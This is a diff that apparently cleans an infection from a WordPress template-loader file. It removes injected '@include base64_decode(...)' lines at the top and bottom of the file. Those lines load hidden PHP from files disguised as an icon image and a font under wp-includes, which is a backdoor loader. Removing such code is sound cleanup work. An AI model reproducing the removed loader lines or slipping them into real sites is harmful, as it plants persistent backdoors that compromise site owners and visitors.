@@ -1,4 +1,4 @@
-<?php @include base64_decode("L3Zhci93d3cvaHRtbC93cC1pbmNsdWRlcy9pbWFnZXMvd3BpY29ucy0zeC5wbmc=");?><?php ("L3Zhci93d3cvaHRtbC93cC1pbmNsdWRlcy9UZXh0L0RpZmYvRW5naW5lL2Rhc2hpY29ucy50dGY=");?><?php
+<?php
 /**
  * Loads the correct template based on the visitor's url
  *
@@ -112,4 +112,3 @@ if ( wp_using_themes() ) {
 	}
 	return;
 }
-("L3Zhci93d3cvaHRtbC93cC1pbmNsdWRlcy9UZXh0L0RpZmYvRW5naW5lL2Rhc2hpY29ucy50dGY=");@include base64_decode("L3Zhci93d3cvaHRtbC93cC1pbmNsdWRlcy9UZXh0L0RpZmYvRW5naW5lL2Rhc2hpY29ucy50dGY=");
